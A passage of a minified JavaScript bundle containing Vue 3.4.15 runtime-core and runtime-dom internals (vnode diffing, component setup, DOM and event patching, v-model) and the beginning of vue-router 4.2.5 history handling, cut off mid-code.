            if (Ws(J, ie)) b(J, ie, _, null, E, $, B, k, D);
            else break;
            Z--, K--
        }
        if (I > Z) {
            if (I <= K) {
                const J = K + 1,
                    ie = J < U ? m[J].el : A;
                for (; I <= K;) b(null, m[I] = D ? Vt(m[I]) : wt(m[I]), _, ie, E, $, B, k, D), I++
            }
        } else if (I > K)
            for (; I <= Z;) He(h[I], E, $, !0), I++;
        else {
            const J = I,
                ie = I,
                me = new Map;
            for (I = ie; I <= K; I++) {
                const Qe = m[I] = D ? Vt(m[I]) : wt(m[I]);
                Qe.key != null && me.set(Qe.key, I)
            }
            let _e, Pe = 0;
            const ft = K - ie + 1;
            let vs = !1,
                xa = 0;
            const Gs = new Array(ft);
            for (I = 0; I < ft; I++) Gs[I] = 0;
            for (I = J; I <= Z; I++) {
                const Qe = h[I];
                if (Pe >= ft) {
                    He(Qe, E, $, !0);
                    continue
                }
                let yt;
                if (Qe.key != null) yt = me.get(Qe.key);
                else
                    for (_e = ie; _e <= K; _e++)
                        if (Gs[_e - ie] === 0 && Ws(Qe, m[_e])) {
                            yt = _e;
                            break
                        }
                yt === void 0 ? He(Qe, E, $, !0) : (Gs[yt - ie] = I + 1, yt >= xa ? xa = yt : vs = !0, b(Qe, m[yt], _, null, E, $, B, k, D), Pe++)
            }
            const _a = vs ? bu(Gs) : _s;
            for (_e = _a.length - 1, I = ft - 1; I >= 0; I--) {
                const Qe = ie + I,
                    yt = m[Qe],
                    Ca = Qe + 1 < U ? m[Qe + 1].el : A;
                Gs[I] === 0 ? b(null, yt, _, Ca, E, $, B, k, D) : vs && (_e < 0 || I !== _a[_e] ? it(yt, _, Ca, 2) : _e--)
            }
        }
    }, it = (h, m, _, A, E = null) => {
        const {
            el: $,
            type: B,
            transition: k,
            children: D,
            shapeFlag: I
        } = h;
        if (I & 6) {
            it(h.component.subTree, m, _, A);
            return
        }
        if (I & 128) {
            h.suspense.move(m, _, A);
            return
        }
        if (I & 64) {
            B.move(h, m, _, G);
            return
        }
        if (B === he) {
            n($, m, _);
            for (let Z = 0; Z < D.length; Z++) it(D[Z], m, _, A);
            n(h.anchor, m, _);
            return
        }
        if (B === Qn) {
            y(h, m, _);
            return
        }
        if (A !== 2 && I & 1 && k)
            if (A === 0) k.beforeEnter($), n($, m, _), Ze(() => k.enter($), E);
            else {
                const {
                    leave: Z,
                    delayLeave: K,
                    afterLeave: J
                } = k, ie = () => n($, m, _), me = () => {
                    Z($, () => {
                        ie(), J && J()
                    })
                };
                K ? K($, ie, me) : me()
            }
        else n($, m, _)
    }, He = (h, m, _, A = !1, E = !1) => {
        const {
            type: $,
            props: B,
            ref: k,
            children: D,
            dynamicChildren: I,
            shapeFlag: U,
            patchFlag: Z,
            dirs: K
        } = h;
        if (k != null && Vr(k, null, _, h, !0), U & 256) {
            m.ctx.deactivate(h);
            return
        }
        const J = U & 1 && K,
            ie = !tn(h);
        let me;
        if (ie && (me = B && B.onVnodeBeforeUnmount) && bt(me, m, h), U & 6) Rn(h.component, _, A);
        else {
            if (U & 128) {
                h.suspense.unmount(_, A);
                return
            }
            J && Jt(h, null, m, "beforeUnmount"), U & 64 ? h.type.remove(h, m, _, E, G, A) : I && ($ !== he || Z > 0 && Z & 64) ? Ve(I, m, _, !1, !0) : ($ === he && Z & 384 || !E && U & 16) && Ve(D, m, _), A && gs(h)
        }(ie && (me = B && B.onVnodeUnmounted) || J) && Ze(() => {
            me && bt(me, m, h), J && Jt(h, null, m, "unmounted")
        }, _)
    }, gs = h => {
        const {
            type: m,
            el: _,
            anchor: A,
            transition: E
        } = h;
        if (m === he) {
            ms(_, A);
            return
        }
        if (m === Qn) {
            C(h);
            return
        }
        const $ = () => {
            i(_), E && !E.persisted && E.afterLeave && E.afterLeave()
        };
        if (h.shapeFlag & 1 && E && !E.persisted) {
            const {
                leave: B,
                delayLeave: k
            } = E, D = () => B(_, $);
            k ? k(h.el, $, D) : D()
        } else $()
    }, ms = (h, m) => {
        let _;
        for (; h !== m;) _ = u(h), i(h), h = _;
        i(m)
    }, Rn = (h, m, _) => {
        const {
            bum: A,
            scope: E,
            update: $,
            subTree: B,
            um: k
        } = h;
        A && Xn(A), E.stop(), $ && ($.active = !1, He(B, h, m, _)), k && Ze(k, m), Ze(() => {
            h.isUnmounted = !0
        }, m), m && m.pendingBranch && !m.isUnmounted && h.asyncDep && !h.asyncResolved && h.suspenseId === m.pendingId && (m.deps--, m.deps === 0 && m.resolve())
    }, Ve = (h, m, _, A = !1, E = !1, $ = 0) => {
        for (let B = $; B < h.length; B++) He(h[B], m, _, A, E)
    }, T = h => h.shapeFlag & 6 ? T(h.component.subTree) : h.shapeFlag & 128 ? h.suspense.next() : u(h.anchor || h.el);
    let z = !1;
    const j = (h, m, _) => {
            h == null ? m._vnode && He(m._vnode, null, null, !0) : b(m._vnode || null, h, m, null, null, null, _), z || (z = !0, Ma(), Lc(), z = !1), m._vnode = h
        },
        G = {
            p: b,
            um: He,
            m: it,
            r: gs,
            mt: te,
            mc: W,
            pc: ae,
            pbc: P,
            n: T,
            o: e
        };
    let pe, xe;
    return t && ([pe, xe] = t(G)), {
        render: j,
        hydrate: pe,
        createApp: du(j, pe)
    }
}

function rr({
    type: e,
    props: t
}, s) {
    return s === "svg" && e === "foreignObject" || s === "mathml" && e === "annotation-xml" && t && t.encoding && t.encoding.includes("html") ? void 0 : s
}

function es({
    effect: e,
    update: t
}, s) {
    e.allowRecurse = t.allowRecurse = s
}

function yu(e, t) {
    return (!e || e && !e.pendingBranch) && t && !t.persisted
}

function qc(e, t, s = !1) {
    const n = e.children,
        i = t.children;
    if (Q(n) && Q(i))
        for (let r = 0; r < n.length; r++) {
            const o = n[r];
            let l = i[r];
            l.shapeFlag & 1 && !l.dynamicChildren && ((l.patchFlag <= 0 || l.patchFlag === 32) && (l = i[r] = Vt(i[r]), l.el = o.el), s || qc(o, l)), l.type === ki && (l.el = o.el)
        }
}

function bu(e) {
    const t = e.slice(),
        s = [0];
    let n, i, r, o, l;
    const a = e.length;
    for (n = 0; n < a; n++) {
        const c = e[n];
        if (c !== 0) {
            if (i = s[s.length - 1], e[i] < c) {
                t[n] = i, s.push(n);
                continue
            }
            for (r = 0, o = s.length - 1; r < o;) l = r + o >> 1, e[s[l]] < c ? r = l + 1 : o = l;
            c < e[s[r]] && (r > 0 && (t[n] = s[r - 1]), s[r] = n)
        }
    }
    for (r = s.length, o = s[r - 1]; r-- > 0;) s[r] = o, o = t[o];
    return s
}

function Kc(e) {
    const t = e.subTree.component;
    if (t) return t.asyncDep && !t.asyncResolved ? t : Kc(t)
}
const wu = e => e.__isTeleport,
    he = Symbol.for("v-fgt"),
    ki = Symbol.for("v-txt"),
    Xt = Symbol.for("v-cmt"),
    Qn = Symbol.for("v-stc"),
    nn = [];
let ut = null;

function O(e = !1) {
    nn.push(ut = e ? null : [])
}

function xu() {
    nn.pop(), ut = nn[nn.length - 1] || null
}
let fn = 1;

function za(e) {
    fn += e
}

function Zc(e) {
    return e.dynamicChildren = fn > 0 ? ut || _s : null, xu(), fn > 0 && ut && ut.push(e), e
}

function R(e, t, s, n, i, r) {
    return Zc(f(e, t, s, n, i, r, !0))
}

function Vs(e, t, s, n, i) {
    return Zc(q(e, t, s, n, i, !0))
}

function oi(e) {
    return e ? e.__v_isVNode === !0 : !1
}

function Ws(e, t) {
    return e.type === t.type && e.key === t.key
}
const Oi = "__vInternal",
    Xc = ({
        key: e
    }) => e ?? null,
    Jn = ({
        ref: e,
        ref_key: t,
        ref_for: s
    }) => (typeof e == "number" && (e = "" + e), e != null ? Ne(e) || Ye(e) || ee(e) ? {
        i: Me,
        r: e,
        k: t,
        f: !!s
    } : e : null);

function f(e, t = null, s = null, n = 0, i = null, r = e === he ? 0 : 1, o = !1, l = !1) {
    const a = {
        __v_isVNode: !0,
        __v_skip: !0,
        type: e,
        props: t,
        key: t && Xc(t),
        ref: t && Jn(t),
        scopeId: Pi,
        slotScopeIds: null,
        children: s,
        component: null,
        suspense: null,
        ssContent: null,
        ssFallback: null,
        dirs: null,
        transition: null,
        el: null,
        anchor: null,
        target: null,
        targetAnchor: null,
        staticCount: 0,
        shapeFlag: r,
        patchFlag: n,
        dynamicProps: i,
        dynamicChildren: null,
        appContext: null,
        ctx: Me
    };
    return l ? (ko(a, s), r & 128 && e.normalize(a)) : s && (a.shapeFlag |= Ne(s) ? 8 : 16), fn > 0 && !o && ut && (a.patchFlag > 0 || r & 6) && a.patchFlag !== 32 && ut.push(a), a
}
const q = _u;

function _u(e, t = null, s = null, n = 0, i = null, r = !1) {
    if ((!e || e === Bp) && (e = Xt), oi(e)) {
        const l = ks(e, t, !0);
        return s && ko(l, s), fn > 0 && !r && ut && (l.shapeFlag & 6 ? ut[ut.indexOf(e)] = l : ut.push(l)), l.patchFlag |= -2, l
    }
    if (ku(e) && (e = e.__vccOpts), t) {
        t = Cu(t);
        let {
            class: l,
            style: a
        } = t;
        l && !Ne(l) && (t.class = Te(l)), Ce(a) && (wc(a) && !Q(a) && (a = De({}, a)), t.style = vo(a))
    }
    const o = Ne(e) ? 1 : zp(e) ? 128 : wu(e) ? 64 : Ce(e) ? 4 : ee(e) ? 2 : 0;
    return f(e, t, s, n, i, o, r, !0)
}

function Cu(e) {
    return e ? wc(e) || Oi in e ? De({}, e) : e : null
}

function ks(e, t, s = !1) {
    const {
        props: n,
        ref: i,
        patchFlag: r,
        children: o
    } = e, l = t ? Su(n || {}, t) : n;
    return {
        __v_isVNode: !0,
        __v_skip: !0,
        type: e.type,
        props: l,
        key: l && Xc(l),
        ref: t && t.ref ? s && i ? Q(i) ? i.concat(Jn(t)) : [i, Jn(t)] : Jn(t) : i,
        scopeId: e.scopeId,
        slotScopeIds: e.slotScopeIds,
        children: o,
        target: e.target,
        targetAnchor: e.targetAnchor,
        staticCount: e.staticCount,
        shapeFlag: e.shapeFlag,
        patchFlag: t && e.type !== he ? r === -1 ? 16 : r | 16 : r,
        dynamicProps: e.dynamicProps,
        dynamicChildren: e.dynamicChildren,
        appContext: e.appContext,
        dirs: e.dirs,
        transition: e.transition,
        component: e.component,
        suspense: e.suspense,
        ssContent: e.ssContent && ks(e.ssContent),
        ssFallback: e.ssFallback && ks(e.ssFallback),
        el: e.el,
        anchor: e.anchor,
        ctx: e.ctx,
        ce: e.ce
    }
}

function gt(e = " ", t = 0) {
    return q(ki, null, e, t)
}

function vt(e, t) {
    const s = q(Qn, null, e);
    return s.staticCount = t, s
}

function Ee(e = "", t = !1) {
    return t ? (O(), Vs(Xt, null, e)) : q(Xt, null, e)
}

function wt(e) {
    return e == null || typeof e == "boolean" ? q(Xt) : Q(e) ? q(he, null, e.slice()) : typeof e == "object" ? Vt(e) : q(ki, null, String(e))
}

function Vt(e) {
    return e.el === null && e.patchFlag !== -1 || e.memo ? e : ks(e)
}

function ko(e, t) {
    let s = 0;
    const {
        shapeFlag: n
    } = e;
    if (t == null) t = null;
    else if (Q(t)) s = 16;
    else if (typeof t == "object")
        if (n & 65) {
            const i = t.default;
            i && (i._c && (i._d = !1), ko(e, i()), i._c && (i._d = !0));
            return
        } else {
            s = 32;
            const i = t._;
            !i && !(Oi in t) ? t._ctx = Me : i === 3 && Me && (Me.slots._ === 1 ? t._ = 1 : (t._ = 2, e.patchFlag |= 1024))
        }
    else ee(t) ? (t = {
        default: t,
        _ctx: Me
    }, s = 32) : (t = String(t), n & 64 ? (s = 16, t = [gt(t)]) : s = 8);
    e.children = t, e.shapeFlag |= s
}

function Su(...e) {
    const t = {};
    for (let s = 0; s < e.length; s++) {
        const n = e[s];
        for (const i in n)
            if (i === "class") t.class !== n.class && (t.class = Te([t.class, n.class]));
            else if (i === "style") t.style = vo([t.style, n.style]);
        else if (Ci(i)) {
            const r = t[i],
                o = n[i];
            o && r !== o && !(Q(r) && r.includes(o)) && (t[i] = r ? [].concat(r, o) : o)
        } else i !== "" && (t[i] = n[i])
    }
    return t
}

function bt(e, t, s, n = null) {
    ht(e, t, 7, [s, n])
}
const Eu = Bc();
let Tu = 0;

function Au(e, t, s) {
    const n = e.type,
        i = (t ? t.appContext : e.appContext) || Eu,
        r = {
            uid: Tu++,
            vnode: e,
            type: n,
            parent: t,
            appContext: i,
            root: null,
            next: null,
            subTree: null,
            effect: null,
            update: null,
            scope: new np(!0),
            render: null,
            proxy: null,
            exposed: null,
            exposeProxy: null,
            withProxy: null,
            provides: t ? t.provides : Object.create(i.provides),
            accessCache: null,
            renderCache: [],
            components: null,
            directives: null,
            propsOptions: zc(n, i),
            emitsOptions: Nc(n, i),
            emit: null,
            emitted: null,
            propsDefaults: be,
            inheritAttrs: n.inheritAttrs,
            ctx: be,
            data: be,
            props: be,
            attrs: be,
            slots: be,
            refs: be,
            setupState: be,
            setupContext: null,
            attrsProxy: null,
            slotsProxy: null,
            suspense: s,
            suspenseId: s ? s.pendingId : 0,
            asyncDep: null,
            asyncResolved: !1,
            isMounted: !1,
            isUnmounted: !1,
            isDeactivated: !1,
            bc: null,
            c: null,
            bm: null,
            m: null,
            bu: null,
            u: null,
            um: null,
            bum: null,
            da: null,
            a: null,
            rtg: null,
            rtc: null,
            ec: null,
            sp: null
        };
    return r.ctx = {
        _: r
    }, r.root = t ? t.root : r, r.emit = Op.bind(null, r), e.ce && e.ce(r), r
}
let Fe = null,
    ai, jr; {
    const e = nc(),
        t = (s, n) => {
            let i;
            return (i = e[s]) || (i = e[s] = []), i.push(n), r => {
                i.length > 1 ? i.forEach(o => o(r)) : i[0](r)
            }
        };
    ai = t("__VUE_INSTANCE_SETTERS__", s => Fe = s), jr = t("__VUE_SSR_SETTERS__", s => $i = s)
}
const Tn = e => {
        const t = Fe;
        return ai(e), e.scope.on(), () => {
            e.scope.off(), ai(t)
        }
    },
    Ua = () => {
        Fe && Fe.scope.off(), ai(null)
    };

function Yc(e) {
    return e.vnode.shapeFlag & 4
}
let $i = !1;

function Lu(e, t = !1) {
    t && jr(t);
    const {
        props: s,
        children: n
    } = e.vnode, i = Yc(e);
    fu(e, s, i, t), hu(e, n);
    const r = i ? Iu(e, t) : void 0;
    return t && jr(!1), r
}

function Iu(e, t) {
    const s = e.type;
    e.accessCache = Object.create(null), e.proxy = xc(new Proxy(e.ctx, nu));
    const {
        setup: n
    } = s;
    if (n) {
        const i = e.setupContext = n.length > 1 ? Pu(e) : null,
            r = Tn(e);
        us();
        const o = Wt(n, e, 0, [e.props, i]);
        if (hs(), r(), ec(o)) {
            if (o.then(Ua, Ua), t) return o.then(l => {
                Ga(e, l, t)
            }).catch(l => {
                Ii(l, e, 0)
            });
            e.asyncDep = o
        } else Ga(e, o, t)
    } else Qc(e, t)
}

function Ga(e, t, s) {
    ee(t) ? e.type.__ssrInlineRender ? e.ssrRender = t : e.render = t : Ce(t) && (e.setupState = Ec(t)), Qc(e, s)
}
let Wa;

function Qc(e, t, s) {
    const n = e.type;
    if (!e.render) {
        if (!t && Wa && !n.render) {
            const i = n.template || Po(e).template;
            if (i) {
                const {
                    isCustomElement: r,
                    compilerOptions: o
                } = e.appContext.config, {
                    delimiters: l,
                    compilerOptions: a
                } = n, c = De(De({
                    isCustomElement: r,
                    delimiters: l
                }, o), a);
                n.render = Wa(i, c)
            }
        }
        e.render = n.render || lt
    } {
        const i = Tn(e);
        us();
        try {
            iu(e)
        } finally {
            hs(), i()
        }
    }
}

function Nu(e) {
    return e.attrsProxy || (e.attrsProxy = new Proxy(e.attrs, {
        get(t, s) {
            return Xe(e, "get", "$attrs"), t[s]
        }
    }))
}

function Pu(e) {
    const t = s => {
        e.exposed = s || {}
    };
    return {
        get attrs() {
            return Nu(e)
        },
        slots: e.slots,
        emit: e.emit,
        expose: t
    }
}

function Ri(e) {
    if (e.exposed) return e.exposeProxy || (e.exposeProxy = new Proxy(Ec(xc(e.exposed)), {
        get(t, s) {
            if (s in t) return t[s];
            if (s in sn) return sn[s](e)
        },
        has(t, s) {
            return s in t || s in sn
        }
    }))
}

function Mu(e, t = !0) {
    return ee(e) ? e.displayName || e.name : e.name || t && e.__name
}

function ku(e) {
    return ee(e) && "__vccOpts" in e
}
const ot = (e, t) => Ep(e, t, $i);

function et(e, t, s) {
    const n = arguments.length;
    return n === 2 ? Ce(t) && !Q(t) ? oi(t) ? q(e, null, [t]) : q(e, t) : q(e, null, t) : (n > 3 ? s = Array.prototype.slice.call(arguments, 2) : n === 3 && oi(s) && (s = [s]), q(e, t, s))
}
const Ou = "3.4.15";
/**
 * @vue/runtime-dom v3.4.15
 * (c) 2018-present Yuxi (Evan) You and Vue contributors
 * @license MIT
 **/
const $u = "http://www.w3.org/2000/svg",
    Ru = "http://www.w3.org/1998/Math/MathML",
    jt = typeof document < "u" ? document : null,
    qa = jt && jt.createElement("template"),
    Du = {
        insert: (e, t, s) => {
            t.insertBefore(e, s || null)
        },
        remove: e => {
            const t = e.parentNode;
            t && t.removeChild(e)
        },
        createElement: (e, t, s, n) => {
            const i = t === "svg" ? jt.createElementNS($u, e) : t === "mathml" ? jt.createElementNS(Ru, e) : jt.createElement(e, s ? {
                is: s
            } : void 0);
            return e === "select" && n && n.multiple != null && i.setAttribute("multiple", n.multiple), i
        },
        createText: e => jt.createTextNode(e),
        createComment: e => jt.createComment(e),
        setText: (e, t) => {
            e.nodeValue = t
        },
        setElementText: (e, t) => {
            e.textContent = t
        },
        parentNode: e => e.parentNode,
        nextSibling: e => e.nextSibling,
        querySelector: e => jt.querySelector(e),
        setScopeId(e, t) {
            e.setAttribute(t, "")
        },
        insertStaticContent(e, t, s, n, i, r) {
            const o = s ? s.previousSibling : t.lastChild;
            if (i && (i === r || i.nextSibling))
                for (; t.insertBefore(i.cloneNode(!0), s), !(i === r || !(i = i.nextSibling)););
            else {
                qa.innerHTML = n === "svg" ? `<svg>${e}</svg>` : n === "mathml" ? `<math>${e}</math>` : e;
                const l = qa.content;
                if (n === "svg" || n === "mathml") {
                    const a = l.firstChild;
                    for (; a.firstChild;) l.appendChild(a.firstChild);
                    l.removeChild(a)
                }
                t.insertBefore(l, s)
            }
            return [o ? o.nextSibling : t.firstChild, s ? s.previousSibling : t.lastChild]
        }
    },
    Hu = Symbol("_vtc");

function Vu(e, t, s) {
    const n = e[Hu];
    n && (t = (t ? [t, ...n] : [...n]).join(" ")), t == null ? e.removeAttribute("class") : s ? e.setAttribute("class", t) : e.className = t
}
const ju = Symbol("_vod"),
    Bu = Symbol("");

function Fu(e, t, s) {
    const n = e.style,
        i = n.display,
        r = Ne(s);
    if (s && !r) {
        if (t && !Ne(t))
            for (const o in t) s[o] == null && Br(n, o, "");
        for (const o in s) Br(n, o, s[o])
    } else if (r) {
        if (t !== s) {
            const o = n[Bu];
            o && (s += ";" + o), n.cssText = s
        }
    } else t && e.removeAttribute("style");
    ju in e && (n.display = i)
}
const Ka = /\s*!important$/;

function Br(e, t, s) {
    if (Q(s)) s.forEach(n => Br(e, t, n));
    else if (s == null && (s = ""), t.startsWith("--")) e.setProperty(t, s);
    else {
        const n = zu(e, t);
        Ka.test(s) ? e.setProperty(Hs(n), s.replace(Ka, ""), "important") : e[n] = s
    }
}
const Za = ["Webkit", "Moz", "ms"],
    or = {};

function zu(e, t) {
    const s = or[t];
    if (s) return s;
    let n = Tt(t);
    if (n !== "filter" && n in e) return or[t] = n;
    n = Ti(n);
    for (let i = 0; i < Za.length; i++) {
        const r = Za[i] + n;
        if (r in e) return or[t] = r
    }
    return t
}
const Xa = "http://www.w3.org/1999/xlink";

function Uu(e, t, s, n, i) {
    if (n && t.startsWith("xlink:")) s == null ? e.removeAttributeNS(Xa, t.slice(6, t.length)) : e.setAttributeNS(Xa, t, s);
    else {
        const r = sp(t);
        s == null || r && !ic(s) ? e.removeAttribute(t) : e.setAttribute(t, r ? "" : s)
    }
}

function Gu(e, t, s, n, i, r, o) {
    if (t === "innerHTML" || t === "textContent") {
        n && o(n, i, r), e[t] = s ?? "";
        return
    }
    const l = e.tagName;
    if (t === "value" && l !== "PROGRESS" && !l.includes("-")) {
        e._value = s;
        const c = l === "OPTION" ? e.getAttribute("value") : e.value,
            d = s ?? "";
        c !== d && (e.value = d), s == null && e.removeAttribute(t);
        return
    }
    let a = !1;
    if (s === "" || s == null) {
        const c = typeof e[t];
        c === "boolean" ? s = ic(s) : s == null && c === "string" ? (s = "", a = !0) : c === "number" && (s = 0, a = !0)
    }
    try {
        e[t] = s
    } catch {}
    a && e.removeAttribute(t)
}

function bs(e, t, s, n) {
    e.addEventListener(t, s, n)
}

function Wu(e, t, s, n) {
    e.removeEventListener(t, s, n)
}
const Ya = Symbol("_vei");

function qu(e, t, s, n, i = null) {
    const r = e[Ya] || (e[Ya] = {}),
        o = r[t];
    if (n && o) o.value = n;
    else {
        const [l, a] = Ku(t);
        if (n) {
            const c = r[t] = Yu(n, i);
            bs(e, l, c, a)
        } else o && (Wu(e, l, o, a), r[t] = void 0)
    }
}
const Qa = /(?:Once|Passive|Capture)$/;

function Ku(e) {
    let t;
    if (Qa.test(e)) {
        t = {};
        let n;
        for (; n = e.match(Qa);) e = e.slice(0, e.length - n[0].length), t[n[0].toLowerCase()] = !0
    }
    return [e[2] === ":" ? e.slice(3) : Hs(e.slice(2)), t]
}
let ar = 0;
const Zu = Promise.resolve(),
    Xu = () => ar || (Zu.then(() => ar = 0), ar = Date.now());

function Yu(e, t) {
    const s = n => {
        if (!n._vts) n._vts = Date.now();
        else if (n._vts <= s.attached) return;
        ht(Qu(n, s.value), t, 5, [n])
    };
    return s.value = e, s.attached = Xu(), s
}

function Qu(e, t) {
    if (Q(t)) {
        const s = e.stopImmediatePropagation;
        return e.stopImmediatePropagation = () => {
            s.call(e), e._stopped = !0
        }, t.map(n => i => !i._stopped && n && n(i))
    } else return t
}
const Ja = e => e.charCodeAt(0) === 111 && e.charCodeAt(1) === 110 && e.charCodeAt(2) > 96 && e.charCodeAt(2) < 123,
    Ju = (e, t, s, n, i, r, o, l, a) => {
        const c = i === "svg";
        t === "class" ? Vu(e, n, c) : t === "style" ? Fu(e, s, n) : Ci(t) ? ho(t) || qu(e, t, s, n, o) : (t[0] === "." ? (t = t.slice(1), !0) : t[0] === "^" ? (t = t.slice(1), !1) : e1(e, t, n, c)) ? Gu(e, t, n, r, o, l, a) : (t === "true-value" ? e._trueValue = n : t === "false-value" && (e._falseValue = n), Uu(e, t, n, c))
    };

function e1(e, t, s, n) {
    if (n) return !!(t === "innerHTML" || t === "textContent" || t in e && Ja(t) && ee(s));
    if (t === "spellcheck" || t === "draggable" || t === "translate" || t === "form" || t === "list" && e.tagName === "INPUT" || t === "type" && e.tagName === "TEXTAREA") return !1;
    if (t === "width" || t === "height") {
        const i = e.tagName;
        if (i === "IMG" || i === "VIDEO" || i === "CANVAS" || i === "SOURCE") return !1
    }
    return Ja(t) && Ne(s) ? !1 : t in e
}
const el = e => {
    const t = e.props["onUpdate:modelValue"] || !1;
    return Q(t) ? s => Xn(t, s) : t
};

function t1(e) {
    e.target.composing = !0
}

function tl(e) {
    const t = e.target;
    t.composing && (t.composing = !1, t.dispatchEvent(new Event("input")))
}
const lr = Symbol("_assign"),
    zt = {
        created(e, {
            modifiers: {
                lazy: t,
                trim: s,
                number: n
            }
        }, i) {
            e[lr] = el(i);
            const r = n || i.props && i.props.type === "number";
            bs(e, t ? "change" : "input", o => {
                if (o.target.composing) return;
                let l = e.value;
                s && (l = l.trim()), r && (l = Ir(l)), e[lr](l)
            }), s && bs(e, "change", () => {
                e.value = e.value.trim()
            }), t || (bs(e, "compositionstart", t1), bs(e, "compositionend", tl), bs(e, "change", tl))
        },
        mounted(e, {
            value: t
        }) {
            e.value = t ?? ""
        },
        beforeUpdate(e, {
            value: t,
            modifiers: {
                lazy: s,
                trim: n,
                number: i
            }
        }, r) {
            if (e[lr] = el(r), e.composing) return;
            const o = i || e.type === "number" ? Ir(e.value) : e.value,
                l = t ?? "";
            o !== l && (document.activeElement === e && e.type !== "range" && (s || n && e.value.trim() === l) || (e.value = l))
        }
    },
    s1 = De({
        patchProp: Ju
    }, Du);
let sl;

function n1() {
    return sl || (sl = mu(s1))
}
const i1 = (...e) => {
    const t = n1().createApp(...e),
        {
            mount: s
        } = t;
    return t.mount = n => {
        const i = o1(n);
        if (!i) return;
        const r = t._component;
        !ee(r) && !r.render && !r.template && (r.template = i.innerHTML), i.innerHTML = "";
        const o = s(i, !1, r1(i));
        return i instanceof Element && (i.removeAttribute("v-cloak"), i.setAttribute("data-v-app", "")), o
    }, t
};

function r1(e) {
    if (e instanceof SVGElement) return "svg";
    if (typeof MathMLElement == "function" && e instanceof MathMLElement) return "mathml"
}

function o1(e) {
    return Ne(e) ? document.querySelector(e) : e
}
/*!
 * vue-router v4.2.5
 * (c) 2023 Eduardo San Martin Morote
 * @license MIT
 */
const ws = typeof window < "u";

function a1(e) {
    return e.__esModule || e[Symbol.toStringTag] === "Module"
}
const ue = Object.assign;

function cr(e, t) {
    const s = {};
    for (const n in t) {
        const i = t[n];
        s[n] = mt(i) ? i.map(e) : e(i)
    }
    return s
}
const rn = () => {},
    mt = Array.isArray,
    l1 = /\/$/,
    c1 = e => e.replace(l1, "");

function dr(e, t, s = "/") {
    let n, i = {},
        r = "",
        o = "";
    const l = t.indexOf("#");
    let a = t.indexOf("?");
    return l < a && l >= 0 && (a = -1), a > -1 && (n = t.slice(0, a), r = t.slice(a + 1, l > -1 ? l : t.length), i = e(r)), l > -1 && (n = n || t.slice(0, l), o = t.slice(l, t.length)), n = u1(n ?? t, s), {
        fullPath: n + (r && "?") + r + o,
        path: n,
        query: i,
        hash: o
    }
}

function d1(e, t) {
    const s = t.query ? e(t.query) : "";
    return t.path + (s && "?") + s + (t.hash || "")
}

function nl(e, t) {
    return !t || !e.toLowerCase().startsWith(t.toLowerCase()) ? e : e.slice(t.length) || "/"
}

function f1(e, t, s) {
    const n = t.matched.length - 1,
        i = s.matched.length - 1;
    return n > -1 && n === i && Os(t.matched[n], s.matched[i]) && Jc(t.params, s.params) && e(t.query) === e(s.query) && t.hash === s.hash
}

function Os(e, t) {
    return (e.aliasOf || e) === (t.aliasOf || t)
}

function Jc(e, t) {
    if (Object.keys(e).length !== Object.keys(t).length) return !1;
    for (const s in e)
        if (!p1(e[s], t[s])) return !1;
    return !0
}

function p1(e, t) {
    return mt(e) ? il(e, t) : mt(t) ? il(t, e) : e === t
}

function il(e, t) {
    return mt(t) ? e.length === t.length && e.every((s, n) => s === t[n]) : e.length === 1 && e[0] === t
}

function u1(e, t) {
    if (e.startsWith("/")) return e;
    if (!e) return t;
    const s = t.split("/"),
        n = e.split("/"),
        i = n[n.length - 1];
    (i === ".." || i === ".") && n.push("");
    let r = s.length - 1,
        o, l;
    for (o = 0; o < n.length; o++)
        if (l = n[o], l !== ".")
            if (l === "..") r > 1 && r--;
            else break;
    return s.slice(0, r).join("/") + "/" + n.slice(o - (o === n.length ? 1 : 0)).join("/")
}
var pn;
(function(e) {
    e.pop = "pop", e.push = "push"
})(pn || (pn = {}));
var on;
(function(e) {
    e.back = "back", e.forward = "forward", e.unknown = ""
})(on || (on = {}));

function h1(e) {
    if (!e)
        if (ws) {
            const t = document.querySelector("base");
            e = t && t.getAttribute("href") || "/", e = e.replace(/^\w+:\/\/[^\/]+/, "")
        } else e = "/";
    return e[0] !== "/" && e[0] !== "#" && (e = "/" + e), c1(e)
}
const g1 = /^[^#]+#/;

function m1(e, t) {
    return e.replace(g1, "#") + t
}

function v1(e, t) {
    const s = document.documentElement.getBoundingClientRect(),
        n = e.getBoundingClientRect();
    return {
        behavior: t.behavior,
        left: n.left - s.left - (t.left || 0),
        top: n.top - s.top - (t.top || 0)
    }
}
const Di = () => ({
    left: window.pageXOffset,
    top: window.pageYOffset
});

function y1(e) {
    let t;
    if ("el" in e) {
        const s = e.el,
            n = typeof s == "string" && s.startsWith("#"),
            i = typeof s == "string" ? n ? document.getElementById(s.slice(1)) : document.querySelector(s) : s;
        if (!i) return;
        t = v1(i, e)
    } else t = e;
    "scrollBehavior" in document.documentElement.style ? window.scrollTo(t) : window.scrollTo(t.left != null ? t.left : window.pageXOffset, t.top != null ? t.top : window.pageYOffset)
}

function rl(e, t) {
    return (history.state ? history.state.position - t : -1) + e
}
const Fr = new Map;

function b1(e, t) {
    Fr.set(e, t)
}

function w1(e) {
    const t = Fr.get(e);
    return Fr.delete(e), t
}
let x1 = () => location.protocol + "//" + location.host;

function ed(e, t) {
    const {
        pathname: s,
        search: n,
        hash: i
    } = t, r = e.indexOf("#");
    if (r > -1) {
        let l = i.includes(e.slice(r)) ? e.slice(r).length : 1,
            a = i.slice(l);
        return a[0] !== "/" && (a = "/" + a), nl(a, "")
    }
    return nl(s, e) + n + i
}

function _1(e, t, s, n) {
    let i = [],
        r = [],
        o = null;
    const l = ({
        state: u
    }) => {
        const g = ed(e, location),
            w = s.value,
            b = t.value;
        let S = 0;
        if (u) {
            if (s.value = g, t.value = u, o && o === w) {
                o = null;
                return
            }
            S = b ? u.position - b.position : 0
        } else n(g);
        i.forEach(x => {
            x(s.value, w, {
                delta: S,
                type: pn.pop,
                direction: S ? S > 0 ? on.forward : on.back : on.unknown
            })
        })
    };

    function a() {
        o = s.value
    }

    function c(u) {
        i.push(u);
        const g = () => {
            const w = i.indexOf(u);
            w > -1 && i.splice(w, 1)
        };
        return r.push(g), g
    }

    function d() {
        const {
            history: u
        } = window;
        u.state && u.replaceState(ue({}, u.state, {
            scroll: Di()
        }), "")
    }

    function p() {
        for (const u of r) u();
        r = [], window.removeEventListener("popstate", l), window.removeEventListener("beforeunload", d)
    }
    return window.addEventListener("popstate", l), window.addEventListener("beforeunload", d, {
        passive: !0
    }), {
        pauseListeners: a,
        listen: c,
        destroy: p
    }
}

function ol(e, t, s, n = !1, i = !1) {
    return {
        back: e,
